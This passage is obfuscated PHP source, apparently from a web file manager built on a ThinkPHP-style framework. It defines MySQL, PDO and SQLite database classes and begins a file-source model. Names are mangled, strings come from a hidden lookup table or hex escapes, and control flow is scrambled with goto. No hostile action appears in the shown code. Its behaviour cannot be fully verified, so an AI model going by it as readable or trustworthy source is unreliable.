$dã‡²¨¾ëÕ[$c™ÃÒÒ‚Õ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $dã‡²¨¾ëÕ; } public function getFields($d³îÀÕƒã¯) { $a¬‘ƒ‚õîÄ =& $_SERVER[Æ]; $D•—ËŸ¼ = $this->query($a¬‘ƒ‚õîÄ[811] . $this->parseKey($d³îÀÕƒã¯)); $Dƒ„Éµ¡¾ = array(); if ($D•—ËŸ¼) { foreach ($D•—ËŸ¼ as $dÁØ‡¨õ¶¢ => $A†¬‰˜äÅå) { $Dƒ„Éµ¡¾[$A†¬‰˜äÅå[$a¬‘ƒ‚õîÄ[27]]] = array($a¬‘ƒ‚õîÄ[28] => $A†¬‰˜äÅå[$a¬‘ƒ‚õîÄ[27]], $a¬‘ƒ‚õîÄ[29] => $A†¬‰˜äÅå[$a¬‘ƒ‚õîÄ[30]], $a¬‘ƒ‚õîÄ[31] => (bool) ($A†¬‰˜äÅå[$a¬‘ƒ‚õîÄ[32]] === $a¬‘ƒ‚õîÄ[33]), $a¬‘ƒ‚õîÄ[34] => $A†¬‰˜äÅå[$a¬‘ƒ‚õîÄ[35]], $a¬‘ƒ‚õîÄ[36] => strtolower($A†¬‰˜äÅå[$a¬‘ƒ‚õîÄ[37]]) == $a¬‘ƒ‚õîÄ[38], $a¬‘ƒ‚õîÄ[39] => strtolower($A†¬‰˜äÅå[$a¬‘ƒ‚õîÄ[40]]) == $a¬‘ƒ‚õîÄ[41]); } } return $Dƒ„Éµ¡¾; } public function getTables($dÀˆ…ëÌ = '') { $aÌßİ‚…Öæ =& $_SERVER[Æ]; $D¤è¸Ôƒ”¾ = !empty($dÀˆ…ëÌ) ? $aÌßİ‚…Öæ[813] . $dÀˆ…ëÌ : $aÌßİ‚…Öæ[814]; $FÙ‘—ÇÚ²¬ = $this->query($D¤è¸Ôƒ”¾); $Cà¥§¶âöï = array(); if ($FÙ‘—ÇÚ²¬) { foreach ($FÙ‘—ÇÚ²¬ as $f‘Á‰´§˜ => $fÄğ…÷¶å) { $Cà¥§¶âöï[$f‘Á‰´§˜] = current($fÄğ…÷¶å); } } return $Cà¥§¶âöï; } public function replace($C‘÷ÇÓÖğÈ, $c¾ æ›Áùì = array()) { $b¥‡£É­É° =& $_SERVER[Æ]; foreach ($C‘÷ÇÓÖğÈ as $DÂ…ÔËŠÕŞ => $Fñ¬Œ‰ò°¯) { $B×™òÅÅ÷ = $this->parseValue($Fñ¬Œ‰ò°¯); if (is_scalar($B×™òÅÅ÷)) { $eĞïìŒ‚Œ[] = $B×™òÅÅ÷; $aŸ­ê•¿™‹[] = $this->parseKey($DÂ…ÔËŠÕŞ); } } $AòËô¥¨µù = $b¥‡£É­É°[815] . $this->parseTable($c¾ æ›Áùì[$b¥‡£É­É°[267]]) . $b¥‡£É­É°[816] . implode($b¥‡£É­É°[47], $aŸ­ê•¿™‹) . $b¥‡£É­É°[817] . implode($b¥‡£É­É°[47], $eĞïìŒ‚Œ) . $b¥‡£É­É°[818]; return $this->execute($AòËô¥¨µù); } public function insertAll($b˜İĞÔí¼, $B˜‚Ä‚¾›¹ = array(), $A‹ˆ¬è²Ê = false) { goto BÙ­¥±Ï”‚; D•ÉİÓ§ÅÏ: $e£‹ÆÎ‘ô‡ = array(); foreach ($b˜İĞÔí¼ as $c‹É´¿´ùÂ) { $fÈŞ¤•ÂÁ¹ = array(); foreach ($c‹É´¿´ùÂ as $d‘¤ê½ŞÏ¤ => $Aì·‘¿½°•) { $Aì·‘¿½°• = $this->parseValue($Aì·‘¿½°•); if (is_scalar($Aì·‘¿½°•)) { $fÈŞ¤•ÂÁ¹[] = $Aì·‘¿½°•; } } $e£‹ÆÎ‘ô‡[] = $AîÕİİóŠ[248] . implode($AîÕİİóŠ[47], $fÈŞ¤•ÂÁ¹) . $AîÕİİóŠ[818]; } array_walk($a°‰Ô‰¬½, array($this, $AîÕİİóŠ[819])); goto AÉƒ¯ê·±‡; BÙ­¥±Ï”‚: $AîÕİİóŠ =& $_SERVER[Æ]; if (!is_array($b˜İĞÔí¼[0])) { return !1; } $a°‰Ô‰¬½ = array_keys($b˜İĞÔí¼[0]); goto D•ÉİÓ§ÅÏ; AÉƒ¯ê·±‡: $C¤ÂâÖÍÎî = ($A‹ˆ¬è²Ê ? $AîÕİİóŠ[820] : $AîÕİİóŠ[821]) . $AîÕİİóŠ[822] . $this->parseTable($B˜‚Ä‚¾›¹[$AîÕİİóŠ[267]]) . $AîÕİİóŠ[816] . implode($AîÕİİóŠ[47], $a°‰Ô‰¬½) . $AîÕİİóŠ[823] . implode($AîÕİİóŠ[47], $e£‹ÆÎ‘ô‡); return $this->execute($C¤ÂâÖÍÎî); goto açîòİĞ×‡; açîòİĞ×‡: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $dÅ™´°ÛîÛ =& $_SERVER[Æ]; $this->error = $this->_linkID->errno . $dÅ™´°ÛîÛ[4] . $this->_linkID->error; if ($dÅ™´°ÛîÛ[33] != $this->queryStr) { $this->error .= LNG($dÅ™´°ÛîÛ[45]) . $this->queryStr; } think_trace($this->error, $dÅ™´°ÛîÛ[33], $dÅ™´°ÛîÛ[46]); return $this->error; } public function escapeString($CÄø–ØÅ‰) { if ($this->_linkID) { return $this->_linkID->real_escape_string($CÄø–ØÅ‰); } else { return addslashes($CÄø–ØÅ‰); } } public function parseKey(&$DµºÅ» , $C–­Áİ˜ï = true) { $C³ÑÀ«¾ =& $_SERVER[Æ]; if ($C–­Áİ˜ï) { $DµºÅ»  = $this->parseKeyCheck($DµºÅ» ); } if ($DµºÅ»  != $C³ÑÀ«¾[176] && !preg_match($C³ÑÀ«¾[824], $DµºÅ» )) { $DµºÅ»  = $C³ÑÀ«¾[825] . trim($DµºÅ» , $C³ÑÀ«¾[825]) . $C³ÑÀ«¾[825]; } return $DµºÅ» ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Dğ‚«³Œ­Â = '') { $d…®¥Ü…ˆİ =& $_SERVER[Æ]; if (!class_exists($d…®¥Ü…ˆİ[827])) { think_exception(think_lang($d…®¥Ü…ˆİ[10]) . $d…®¥Ü…ˆİ[828]); } if (!empty($Dğ‚«³Œ­Â)) { $this->config = $Dğ‚«³Œ­Â; if (empty($this->config[$d…®¥Ü…ˆİ[13]])) { $this->config[$d…®¥Ü…ˆİ[13]] = array(); } } } public function connect($A©”é¼»ôË = '', $eñ»ÌÈ´ÕÂ = 0) { $fáªå°ïª =& $_SERVER[Æ]; if (!isset($this->linkID[$eñ»ÌÈ´ÕÂ])) { goto Có¡µ©‰—Æ; Fš»À¥ÏÏ…: $this->dbType = $this->_getDsnType($A©”é¼»ôË[$fáªå°ïª[829]]); if (in_array($this->dbType, array($fáªå°ïª[830], $fáªå°ïª[831], $fáªå°ïª[832], $fáªå°ïª[833]))) { think_exception($fáªå°ïª[834] . $this->dbType . $fáªå°ïª[835] . $this->dbType . $fáªå°ïª[836]); } if (!$this->linkID[$eñ»ÌÈ´ÕÂ]) { think_exception($fáªå°ïª[837]); } goto c¯ÓééŠ÷; Có¡µ©‰—Æ: if (empty($A©”é¼»ôË)) { $A©”é¼»ôË = $this->config; } if ($this->pconnect) { $A©”é¼»ôË[$fáªå°ïª[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$eñ»ÌÈ´ÕÂ] = new PDO($A©”é¼»ôË[$fáªå°ïª[829]], $A©”é¼»ôË[$fáªå°ïª[802]], $A©”é¼»ôË[$fáªå°ïª[803]], $A©”é¼»ôË[$fáªå°ïª[13]]); } catch (PDOException $f‹Û¸é­›¸) { think_exception($f‹Û¸é­›¸->getMessage()); } goto Fš»À¥ÏÏ…; c¯ÓééŠ÷: $this->linkID[$eñ»ÌÈ´ÕÂ]->exec($fáªå°ïª[838] . think_config($fáªå°ïª[805])); $this->connected = !0; if (1 != think_config($fáªå°ïª[18])) { unset($this->config); } goto dÉ¸×·öÒá; dÉ¸×·öÒá: } return $this->linkID[$eñ»ÌÈ´ÕÂ]; } public function free() { $this->PDOStatement = null; } public function query($eËÕ©ôŸÖÎ, $FĞ¸’®¾Î” = array()) { goto AÀ¯·Åé¿; F‰¶¤ŠØËÂ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $eÎŠ‡‡àÅŠ = $this->PDOStatement->execute($FĞ¸’®¾Î”); $this->debug(); goto c±ãÕğ‡‘Ô; AÀ¯·Åé¿: $A¬é£Îí¬ =& $_SERVER[Æ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto BÉŞ‡À…®; b”Á×â¾Ğ³: think_action_status($A¬é£Îí¬[19], 1); think_status($A¬é£Îí¬[20]); $this->PDOStatement = $this->_linkID->prepare($eËÕ©ôŸÖÎ); goto F‰¶¤ŠØËÂ; c±ãÕğ‡‘Ô: if (!1 === $eÎŠ‡‡àÅŠ) { $this->error(); return !1; } else { return $this->getAll(); } goto cÓ—ç¸®Ö; BÉŞ‡À…®: $this->queryStr = $eËÕ©ôŸÖÎ; if (!empty($FĞ¸’®¾Î”)) { $this->queryStr .= $A¬é£Îí¬[839] . print_r($FĞ¸’®¾Î”, !0) . $A¬é£Îí¬[840]; } if (!empty($this->PDOStatement)) { $this->free(); } goto b”Á×â¾Ğ³; cÓ—ç¸®Ö: } public function execute($d”¿ßÍñ¼Š, $F‡Â®‰®ì = array()) { goto CŠµÅ¼; a°˜ï°„¥µ: $BËä¹ÂÃ ³ = $this->PDOStatement->execute($F‡Â®‰®ì); $this->debug(); if (!1 === $BËä¹ÂÃ ³) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($F’±‡„’ãŞ || preg_match($CÖ¾Ïï“¹[845], $d”¿ßÍñ¼Š)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto EËìÖ¿÷Í; CŠµÅ¼: $CÖ¾Ïï“¹ =& $_SERVER[Æ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto BÙŒõùÅ±á; d—»šã·¡”: think_status($CÖ¾Ïï“¹[20]); $this->PDOStatement = $this->_linkID->prepare($d”¿ßÍñ¼Š); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto a°˜ï°„¥µ; F’‡ì¦Ÿ††: if ($this->dbType == $CÖ¾Ïï“¹[833]) { if (preg_match($CÖ¾Ïï“¹[841], $this->queryStr, $EšËïÚ³–)) { $this->table = think_config($CÖ¾Ïï“¹[842]) . str_ireplace(think_config($CÖ¾Ïï“¹[843]), $CÖ¾Ïï“¹[361], $EšËïÚ³–[2]); $F’±‡„’ãŞ = (bool) $this->query($CÖ¾Ïï“¹[844] . strtoupper($this->table) . $CÖ¾Ïï“¹[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($CÖ¾Ïï“¹[21], 1); goto d—»šã·¡”; BÙŒõùÅ±á: $this->queryStr = $d”¿ßÍñ¼Š; if (!empty($F‡Â®‰®ì)) { $this->queryStr .= $CÖ¾Ïï“¹[839] . print_r($F‡Â®‰®ì, !0) . $CÖ¾Ïï“¹[840]; } $F’±‡„’ãŞ = !1; goto F’‡ì¦Ÿ††; EËìÖ¿÷Í: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $eÒ½Ò¯ô±Ì = $this->_linkID->commit(); $this->transTimes = 0; if (!$eÒ½Ò¯ô±Ì) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $c›»İ†ÈÔ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$c›»İ†ÈÔ) { $this->error(); return !1; } } return !0; } private function getAll() { $a“ğ”„œÑÏ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($a“ğ”„œÑÏ); return $a“ğ”„œÑÏ; } public function getFields($d“â°ß§Š¹) { goto E‹Íß¤¹Æà; E‹Íß¤¹Æà: $d¿¬ëš•Í’ =& $_SERVER[Æ]; $this->initConnect(!0); if (think_config($d¿¬ëš•Í’[846])) { $C‘öíª¥¿ = str_replace($d¿¬ëš•Í’[847], $d“â°ß§Š¹, think_config($d¿¬ëš•Í’[846])); } else { switch ($this->dbType) { case $d¿¬ëš•Í’[830]: case $d¿¬ëš•Í’[848]: $C‘öíª¥¿ = "\123\x45\114\x45\x43\124\x20\x20\40\x63\x6f\x6c\x75\x6d\x6e\x5f\x6e\141\x6d\145\x20\141\163\40\47\116\x61\x6d\145\47\x2c\x20\x20\40\x64\141\164\141\x5f\164\171\x70\x65\x20\x61\x73\40\47\x54\x79\160\x65\x27\54\40\40\x20\x63\x6f\x6c\x75\x6d\156\x5f\144\x65\x66\x61\165\154\x74\x20\141\x73\40\47\104\x65\146\x61\x75\x6c\x74\47\54\40\x20\x20\151\x73\x5f\x6e\165\154\x6c\x61\x62\154\145\x20\x61\x73\x20\47\x4e\x75\154\x6c\47\xa\11\11\106\x52\117\x4d\11\x69\x6e\146\157\162\155\141\x74\151\x6f\x6e\x5f\163\143\150\x65\155\141\56\x74\x61\142\x6c\x65\163\40\x41\123\x20\x74\12\x9\x9\112\117\111\116\11\151\x6e\146\x6f\x72\155\141\x74\151\157\x6e\x5f\x73\x63\150\145\155\141\56\x63\157\154\165\155\156\x73\40\x41\x53\40\x63\xa\x9\11\117\x4e\40\x20\x74\x2e\x74\141\x62\154\145\137\x63\141\164\141\x6c\157\x67\x20\75\40\x63\x2e\x74\x61\142\x6c\x65\x5f\x63\x61\164\141\x6c\157\147\xa\11\11\x41\116\x44\40\x74\x2e\x74\x61\x62\x6c\x65\x5f\163\143\x68\145\x6d\141\x20\x3d\40\143\x2e\164\141\142\154\145\137\163\x63\x68\145\155\141\12\x9\x9\x41\116\x44\40\x74\56\164\141\142\x6c\145\x5f\156\141\155\x65\40\x3d\x20\143\56\164\141\142\154\x65\137\156\x61\155\145\12\11\11\127\110\x45\122\x45\x20\40\40\164\56\164\141\x62\154\145\x5f\156\x61\x6d\x65\x20\x3d\x20\47{$d“â°ß§Š¹}\47"; break; case $d¿¬ëš•Í’[849]: $C‘öíª¥¿ = $d¿¬ëš•Í’[850] . $d“â°ß§Š¹ . $d¿¬ëš•Í’[851]; break; case $d¿¬ëš•Í’[831]: case $d¿¬ëš•Í’[833]: $C‘öíª¥¿ = $d¿¬ëš•Í’[852] . $d¿¬ëš•Í’[853] . $d¿¬ëš•Í’[854] . strtoupper($d“â°ß§Š¹) . $d¿¬ëš•Í’[855] . strtoupper($d“â°ß§Š¹) . $d¿¬ëš•Í’[856]; break; case $d¿¬ëš•Í’[857]: $C‘öíª¥¿ = $d¿¬ëš•Í’[858] . $d“â°ß§Š¹ . $d¿¬ëš•Í’[859]; break; case $d¿¬ëš•Í’[832]: break; case $d¿¬ëš•Í’[860]: default: $C‘öíª¥¿ = $d¿¬ëš•Í’[861] . ($this->dbType == $d¿¬ëš•Í’[860] ? "\x60{$d“â°ß§Š¹}\x60" : $d“â°ß§Š¹); } } goto FŠ„òæÌÊë; C¸•Ğ»ô²: return $CÉ’›ùù¦Ş; goto E¬ªğ¥ğƒñ; FŠ„òæÌÊë: $aÊ»ï…•ò¢ = $this->query($C‘öíª¥¿); $CÉ’›ùù¦Ş = array(); if ($aÊ»ï…•ò¢) { foreach ($aÊ»ï…•ò¢ as $cñ•§çöÈÅ => $BªçŞŒÚ¥“) { $BªçŞŒÚ¥“ = array_change_key_case($BªçŞŒÚ¥“); $BªçŞŒÚ¥“[$d¿¬ëš•Í’[28]] = isset($BªçŞŒÚ¥“[$d¿¬ëš•Í’[28]]) ? $BªçŞŒÚ¥“[$d¿¬ëš•Í’[28]] : $d¿¬ëš•Í’[361]; $BªçŞŒÚ¥“[$d¿¬ëš•Í’[29]] = isset($BªçŞŒÚ¥“[$d¿¬ëš•Í’[29]]) ? $BªçŞŒÚ¥“[$d¿¬ëš•Í’[29]] : $d¿¬ëš•Í’[361]; $f°íåĞ¢³” = isset($BªçŞŒÚ¥“[$d¿¬ëš•Í’[261]]) ? $BªçŞŒÚ¥“[$d¿¬ëš•Í’[261]] : $BªçŞŒÚ¥“[$d¿¬ëš•Í’[28]]; $CÉ’›ùù¦Ş[$f°íåĞ¢³”] = array($d¿¬ëš•Í’[28] => $f°íåĞ¢³”, $d¿¬ëš•Í’[29] => $BªçŞŒÚ¥“[$d¿¬ëš•Í’[29]], $d¿¬ëš•Í’[31] => (bool) (isset($BªçŞŒÚ¥“[$d¿¬ëš•Í’[99]]) && $BªçŞŒÚ¥“[$d¿¬ëš•Í’[99]] === $d¿¬ëš•Í’[33] || isset($BªçŞŒÚ¥“[$d¿¬ëš•Í’[31]]) && $BªçŞŒÚ¥“[$d¿¬ëš•Í’[31]] === $d¿¬ëš•Í’[33]), $d¿¬ëš•Í’[34] => isset($BªçŞŒÚ¥“[$d¿¬ëš•Í’[34]]) ? $BªçŞŒÚ¥“[$d¿¬ëš•Í’[34]] : (isset($BªçŞŒÚ¥“[$d¿¬ëš•Í’[53]]) ? $BªçŞŒÚ¥“[$d¿¬ëš•Í’[53]] : $d¿¬ëš•Í’[361]), $d¿¬ëš•Í’[36] => isset($BªçŞŒÚ¥“[$d¿¬ëš•Í’[89]]) ? strtolower($BªçŞŒÚ¥“[$d¿¬ëš•Í’[89]]) == $d¿¬ëš•Í’[38] : (isset($BªçŞŒÚ¥“[$d¿¬ëš•Í’[54]]) ? $BªçŞŒÚ¥“[$d¿¬ëš•Í’[54]] : !1), $d¿¬ëš•Í’[39] => isset($BªçŞŒÚ¥“[$d¿¬ëš•Í’[862]]) ? strtolower($BªçŞŒÚ¥“[$d¿¬ëš•Í’[862]]) == $d¿¬ëš•Í’[41] : (isset($BªçŞŒÚ¥“[$d¿¬ëš•Í’[89]]) ? $BªçŞŒÚ¥“[$d¿¬ëš•Í’[89]] : !1)); } } goto C¸•Ğ»ô²; E¬ªğ¥ğƒñ: } public function getTables($E±÷‰ƒªˆ = '') { $eğë¢ë…ãÕ =& $_SERVER[Æ]; if (think_config($eğë¢ë…ãÕ[863])) { $D’…à»÷ˆ¢ = str_replace($eğë¢ë…ãÕ[864], $E±÷‰ƒªˆ, think_config($eğë¢ë…ãÕ[863])); } else { switch ($this->dbType) { case $eğë¢ë…ãÕ[831]: case $eğë¢ë…ãÕ[833]: $D’…à»÷ˆ¢ = $eğë¢ë…ãÕ[865]; break; case $eğë¢ë…ãÕ[830]: case $eğë¢ë…ãÕ[848]: $D’…à»÷ˆ¢ = $eğë¢ë…ãÕ[866]; break; case $eğë¢ë…ãÕ[857]: $D’…à»÷ˆ¢ = $eğë¢ë…ãÕ[867]; break; case $eğë¢ë…ãÕ[832]: think_exception(think_lang($eğë¢ë…ãÕ[868]) . $eğë¢ë…ãÕ[869]); break; case $eğë¢ë…ãÕ[849]: $D’…à»÷ˆ¢ = $eğë¢ë…ãÕ[42] . $eğë¢ë…ãÕ[43] . $eğë¢ë…ãÕ[44]; break; case $eğë¢ë…ãÕ[860]: default: if (!empty($E±÷‰ƒªˆ)) { $D’…à»÷ˆ¢ = $eğë¢ë…ãÕ[813] . $E±÷‰ƒªˆ; } else { $D’…à»÷ˆ¢ = $eğë¢ë…ãÕ[814]; } } } $bß¾÷§Ü¼ = $this->query($D’…à»÷ˆ¢); $aÖŠ„ê¸¥› = array(); foreach ($bß¾÷§Ü¼ as $CÔÉœëôé¼ => $bâ¥‘°™õ) { $aÖŠ„ê¸¥›[$CÔÉœëôé¼] = current($bâ¥‘°™õ); } return $aÖŠ„ê¸¥›; } protected function parseLimit($e¥² îŸ›¿) { $bÜÜ·œ¸„Ö =& $_SERVER[Æ]; $e‹·Ù˜¾Ğ® = $bÜÜ·œ¸„Ö[33]; if (!empty($e¥² îŸ›¿)) { switch ($this->dbType) { case $bÜÜ·œ¸„Ö[857]: case $bÜÜ·œ¸„Ö[849]: $e¥² îŸ›¿ = explode($bÜÜ·œ¸„Ö[47], $e¥² îŸ›¿); if (count($e¥² îŸ›¿) > 1) { $e‹·Ù˜¾Ğ® .= $bÜÜ·œ¸„Ö[48] . $e¥² îŸ›¿[1] . $bÜÜ·œ¸„Ö[49] . $e¥² îŸ›¿[0] . $bÜÜ·œ¸„Ö[50]; } else { $e‹·Ù˜¾Ğ® .= $bÜÜ·œ¸„Ö[48] . $e¥² îŸ›¿[0] . $bÜÜ·œ¸„Ö[50]; } break; case $bÜÜ·œ¸„Ö[830]: case $bÜÜ·œ¸„Ö[848]: break; case $bÜÜ·œ¸„Ö[832]: break; case $bÜÜ·œ¸„Ö[831]: case $bÜÜ·œ¸„Ö[833]: break; case $bÜÜ·œ¸„Ö[860]: default: $e‹·Ù˜¾Ğ® .= $bÜÜ·œ¸„Ö[48] . $e¥² îŸ›¿ . $bÜÜ·œ¸„Ö[50]; } } return $e‹·Ù˜¾Ğ®; } public function parseKey(&$cë§‹­âù›, $fºì‹‡É† = true) { $Aã½ŠÁÈ =& $_SERVER[Æ]; if ($fºì‹‡É†) { $cë§‹­âù› = $this->parseKeyCheck($cë§‹­âù›); } if ($this->dbType == $Aã½ŠÁÈ[860]) { if ($cë§‹­âù› != $Aã½ŠÁÈ[176] && !preg_match($Aã½ŠÁÈ[824], $cë§‹­âù›)) { $cë§‹­âù› = $Aã½ŠÁÈ[825] . trim($cë§‹­âù›, $Aã½ŠÁÈ[825]) . $Aã½ŠÁÈ[825]; } return $cë§‹­âù›; } else { return parent::parseKey($cë§‹­âù›); } } public function close() { $this->_linkID = null; } public function error() { $a÷©À îãŞ =& $_SERVER[Æ]; if ($this->PDOStatement) { $AçèÅ„öÂã = $this->PDOStatement->errorInfo(); $this->error = $AçèÅ„öÂã[1] . $a÷©À îãŞ[4] . $AçèÅ„öÂã[2]; } else { $this->error = $a÷©À îãŞ[33]; } if ($a÷©À îãŞ[33] != $this->queryStr) { $this->error .= LNG($a÷©À îãŞ[45]) . $this->queryStr; } think_trace($this->error, $a÷©À îãŞ[33], $a÷©À îãŞ[46]); return $this->error; } public function escapeString($b‘Ñ¼‡è·¹) { $Fâ”ã£‡¥¦ =& $_SERVER[Æ]; switch ($this->dbType) { case $Fâ”ã£‡¥¦[857]: case $Fâ”ã£‡¥¦[830]: case $Fâ”ã£‡¥¦[848]: case $Fâ”ã£‡¥¦[860]: return addslashes($b‘Ñ¼‡è·¹); case $Fâ”ã£‡¥¦[832]: case $Fâ”ã£‡¥¦[849]: case $Fâ”ã£‡¥¦[831]: case $Fâ”ã£‡¥¦[833]: return str_ireplace($Fâ”ã£‡¥¦[55], $Fâ”ã£‡¥¦[56], $b‘Ñ¼‡è·¹); } } protected function parseValue($DÈÍÅâŸ÷‘) { $a×‹ƒšøê =& $_SERVER[Æ]; if (is_string($DÈÍÅâŸ÷‘)) { $DÈÍÅâŸ÷‘ = strpos($DÈÍÅâŸ÷‘, $a×‹ƒšøê[4]) === 0 ? $this->escapeString($DÈÍÅâŸ÷‘) : $a×‹ƒšøê[870] . $this->escapeString($DÈÍÅâŸ÷‘) . $a×‹ƒšøê[870]; } elseif (isset($DÈÍÅâŸ÷‘[0]) && is_string($DÈÍÅâŸ÷‘[0]) && strtolower($DÈÍÅâŸ÷‘[0]) == $a×‹ƒšøê[285]) { $DÈÍÅâŸ÷‘ = $this->escapeString($DÈÍÅâŸ÷‘[1]); } elseif (is_array($DÈÍÅâŸ÷‘)) { $DÈÍÅâŸ÷‘ = array_map(array($this, $a×‹ƒšøê[871]), $DÈÍÅâŸ÷‘); } elseif (is_bool($DÈÍÅâŸ÷‘)) { $DÈÍÅâŸ÷‘ = $DÈÍÅâŸ÷‘ ? $a×‹ƒšøê[83] : $a×‹ƒšøê[468]; } elseif (is_null($DÈÍÅâŸ÷‘)) { $DÈÍÅâŸ÷‘ = $a×‹ƒšøê[99]; } return $DÈÍÅâŸ÷‘; } public function getLastInsertId() { $E¯²İÚë„ =& $_SERVER[Æ]; switch ($this->dbType) { case $E¯²İÚë„[857]: case $E¯²İÚë„[849]: case $E¯²İÚë„[830]: case $E¯²İÚë„[848]: case $E¯²İÚë„[832]: case $E¯²İÚë„[860]: return $this->_linkID->lastInsertId(); case $E¯²İÚë„[831]: case $E¯²İÚë„[833]: $E…¸Õ¦¢Æ = $this->table; $EÁ æ¿æ•· = $this->query("\123\x45\114\x45\103\x54\x20{$E…¸Õ¦¢Æ}\x2e\143\165\162\162\x76\141\x6c\x20\x63\x75\162\162\x76\141\154\40\106\x52\117\115\40\x64\x75\x61\x6c"); return $EÁ æ¿æ•· ? $EÁ æ¿æ•·[0][$E¯²İÚë„[872]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($A°µŠÔÌ˜ª) { goto eç²‚â³Í»; AÉÍ¾¢ÁÑ: fclose($E¹à½òôäˆ); show_json($DÉ§Û‡·Ê[875], !1); return !1; goto eó¾Ï‹…ë; eç²‚â³Í»: $DÉ§Û‡·Ê =& $_SERVER[Æ]; $AÕÛõ‡Å¾å = DATA_PATH . $DÉ§Û‡·Ê[873]; $E¹à½òôäˆ = fopen($AÕÛõ‡Å¾å, $DÉ§Û‡·Ê[874]); goto c×†ŠÛ­éõ; c×†ŠÛ­éõ: if (!$E¹à½òôäˆ) { return !1; } if (flock($E¹à½òôäˆ, LOCK_EX)) { $C°¼êÔ»öÑ = parent::query($A°µŠÔÌ˜ª); flock($E¹à½òôäˆ, LOCK_UN); fclose($E¹à½òôäˆ); return $C°¼êÔ»öÑ; } flock($E¹à½òôäˆ, LOCK_UN); goto AÉÍ¾¢ÁÑ; eó¾Ï‹…ë: } public function execute($EéÂÏã¿ßƒ) { goto f´ö‡²ì; f´ö‡²ì: $f¾ªö„„•Ï =& $_SERVER[Æ]; $C®Í¶ç…­î = DATA_PATH . $f¾ªö„„•Ï[873]; $EùÚ‘µË³¦ = fopen($C®Í¶ç…­î, $f¾ªö„„•Ï[874]); goto CšîÆÏÀÁ; CÎø²éµ±Ö: fclose($EùÚ‘µË³¦); show_json($f¾ªö„„•Ï[875], !1); return !1; goto a¯ˆ‡î¹»; CšîÆÏÀÁ: if (!$EùÚ‘µË³¦) { return !1; } if (flock($EùÚ‘µË³¦, LOCK_EX)) { $fîŞÙ—§Ò† = parent::execute($EéÂÏã¿ßƒ); flock($EùÚ‘µË³¦, LOCK_UN); fclose($EùÚ‘µË³¦); return $fîŞÙ—§Ò†; } flock($EùÚ‘µË³¦, LOCK_UN); goto CÎø²éµ±Ö; a¯ˆ‡î¹»: } } goto b†¶©‚æ¬†; C†ñ–ÛŞ‹: class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\x75\x72\x63\145"; protected $tableMeta = array("\x74\141\x62\154\x65\116\x61\155\145" => "\151\x6f\137\163\157\x75\162\143\145\137\x6d\x65\164\141", "\155\x65\x74\141\106\151\x65\154\144" => "\163\x6f\165\162\143\145\111\104"); protected $dataAuto = array(array("\155\157\x64\151\146\x79\x54\151\x6d\145", "\164\x69\x6d\145", "\151\x6e\x73\145\162\x74", "\146\x75\156\x63\x74\x69\157\156"), array("\x63\162\145\141\164\x65\x54\151\x6d\145", "\164\x69\155\145", "\x69\x6e\x73\x65\162\164", "\x66\x75\x6e\x63\x74\151\x6f\156"), array("\x76\151\x65\x77\124\151\155\x65", "\164\x69\155\x65", "\151\x6e\163\145\162\164", "\x66\x75\x6e\x63\164\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($aµÚ„ˆì„) { return $this->listSource(array($_SERVER[Æ][368] => $aµÚ„ˆì„)); } public function typeName($FÇ«®…‡öƒ) { static $cëŞÔò¦¿± = array(self::TYPE_SYSTEM => "\x73\x79\163\x74\x65\155", self::TYPE_USER => "\165\x73\145\162", self::TYPE_GROUP => "\x67\x72\157\x75\160"); return $cëŞÔò¦¿±[$FÇ«®…‡öƒ . $_SERVER[Æ][33]]; } public function sourceListInfo($b­èŒÊµ¹, $aÏá ãìÜ’ = false) { goto b¦óˆÙ—Øô; E›¤Û­ƒ»œ: return array_to_keyvalue($FÎ»Í½Ñ§Ö, $D¨æÓ†ÁŸÆ[369]); goto C¬ÈÅÅ™Ş‡; b¦óˆÙ—Øô: $D¨æÓ†ÁŸÆ =& $_SERVER[Æ]; $b­èŒÊµ¹ = $b­èŒÊµ¹ ? $b­èŒÊµ¹ : array(); $b­èŒÊµ¹ = array_filter(array_unique($b­èŒÊµ¹)); goto d¨“–°®™¹; d¨“–°®™¹: if (!$b­èŒÊµ¹) { return array(); } $FÎ»Í½Ñ§Ö = $this->where(array($D¨æÓ†ÁŸÆ[369] => array($D¨æÓ†ÁŸÆ[7], $b­èŒÊµ¹)))->select(); $this->_listDataApply($FÎ»Í½Ñ§Ö, $aÏá ãìÜ’); goto E›¤Û­ƒ»œ; C¬ÈÅÅ™Ş‡: } public function pathInfoFilter($c“¶±ªªÖ¡) { goto c°ñ¸ØéÈ‡; Dœù¹¯ùìŞ: $b£¬³­ªØ .= $Aµ«„½ÓÉõ[374]; $b£¬³­ªØ .= $Aµ«„½ÓÉõ[375]; $BÙÖ³İÕ = explode($Aµ«„½ÓÉõ[47], $b£¬³­ªØ); goto cÉè£ãÃ­¦; FèàÍ¶Á÷: $c“¶±ªªÖ¡[$Aµ«„½ÓÉõ[371]] = $this->typeName($c“¶±ªªÖ¡[$Aµ«„½ÓÉõ[371]]); if ($c“¶±ªªÖ¡[$Aµ«„½ÓÉõ[370]] != 1) { $c“¶±ªªÖ¡[$Aµ«„½ÓÉõ[160]] = $c“¶±ªªÖ¡[$Aµ«„½ÓÉõ[372]]; 